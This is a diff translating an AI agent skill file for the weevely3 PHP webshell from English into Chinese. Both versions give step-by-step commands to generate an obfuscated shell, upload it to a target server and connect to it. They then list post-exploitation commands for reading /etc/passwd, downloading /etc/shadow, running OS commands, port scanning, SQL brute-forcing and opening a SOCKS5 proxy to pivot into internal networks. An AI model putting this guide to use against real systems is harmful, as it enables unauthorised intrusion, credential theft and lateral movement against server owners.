@@ -1,48 +1,44 @@
 ---
 name: weevely3
 description: >
-  This skill should be used when the user asks about "weevely3", "file ops,
-  pivoting", "modules for file ops". Stealth PHP webshell with 30+
-  post-exploitation modules for file ops, pivoting, and persistence. Use after
-  file upload or RFI vulnerabilities to get an interactive PHP shell with
-  built-in post-ex modules.
+  此技能适用于用户询问关于 "weevely3"、"文件操作、横向移动"、"文件操作模块"。隐蔽 PHP Webshell，内置 30+ 后渗透模块，支持文件操作、横向移动和持久化。在文件上传或 RFI 漏洞利用成功后使用，可获得带内置后渗透模块的交互式 PHP Shell。
 ---
 
 # Weevely3
 
-Stealth PHP webshell with 30+ post-exploitation modules.
+内置 30+ 后渗透模块的隐蔽 PHP Webshell。
 
-## Quick Start
+## 快速开始
 
 ```bash
 git clone https://github.com/epinna/weevely3
 cd weevely3 && pip3 install -r requirements.txt
 
-# Generate obfuscated PHP shell
+# 生成混淆后的 PHP Shell
 python3 weevely.py generate MyPassword shell.php
-# Upload shell.php to target
+# 将 shell.php 上传到目标服务器
 
-# Connect
+# 连接
 python3 weevely.py http://target.com/uploads/shell.php MyPassword
 ```
 
-## Core Commands (in shell)
+## 核心命令（Shell 内使用）
 
-| Command | Purpose |
+| 命令 | 用途 |
 |---------|---------|
-| `:help` | List all modules |
-| `:file_read /etc/passwd` | Read file |
-| `:file_download /etc/shadow /tmp/shadow` | Download file |
-| `:file_upload /local/file /remote/path` | Upload file |
-| `:shell_sh "id"` | Run OS command |
-| `:net_scan 192.168.1.0/24 22,80,443` | Port scan |
-| `:net_proxy socks5` | Start SOCKS5 proxy |
-| `:audit_phpconf` | Audit PHP config |
-| `:bruteforce_sql` | SQL brute-force |
+| `:help` | 列出所有模块 |
+| `:file_read /etc/passwd` | 读取文件 |
+| `:file_download /etc/shadow /tmp/shadow` | 下载文件 |
+| `:file_upload /local/file /remote/path` | 上传文件 |
+| `:shell_sh "id"` | 执行 OS 命令 |
+| `:net_scan 192.168.1.0/24 22,80,443` | 端口扫描 |
+| `:net_proxy socks5` | 启动 SOCKS5 代理 |
+| `:audit_phpconf` | 审计 PHP 配置 |
+| `:bruteforce_sql` | SQL 暴力破解 |
 
-## Common Workflows
+## 常用工作流
 
-**Full post-ex after upload:**
+**上传后完整后渗透流程：**
 ```
 :shell_sh "id && uname -a"
 :file_read /etc/passwd
@@ -50,14 +46,14 @@ python3 weevely.py http://target.com/uploads/shell.php MyPassword
 :net_proxy socks5 0.0.0.0 1080
 ```
 
-**Pivot via SOCKS5:**
+**通过 SOCKS5 进行横向移动：**
 ```
 :net_proxy socks5 127.0.0.1 1080
-# Configure proxychains → proxychains nmap internal_host
+# 配置 proxychains → proxychains nmap internal_host
 ```
 
-## Resources
+## 参考资源
 
-| File | When to load |
+| 文件 | 何时加载 |
 |------|--------------|
-| `references/` | Module list and evasion options |
+| `references/` | 模块列表及绕过选项 |
